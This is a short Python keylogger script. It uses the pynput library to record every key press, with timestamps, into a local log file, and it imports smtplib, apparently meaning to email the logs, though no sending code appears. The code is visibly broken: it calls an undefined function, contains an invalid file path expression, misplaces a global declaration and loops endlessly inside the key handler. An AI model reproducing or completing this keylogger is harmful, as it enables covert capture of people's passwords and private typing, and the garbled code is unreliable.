import smtplib
from pynput.keyboard import Key, Listener
import logging
import os
import time

log_dir = ""
global c
c=time.time()
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    while(True):
        logging.info('"{0}"'.format(key))
        if(nc()==1 and (time.time()-c)>=100):
            
            global c
            c=time.time()
            
            os.remove(log_dir/log.txt)
            

with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    finally:
        listener.stop()
       

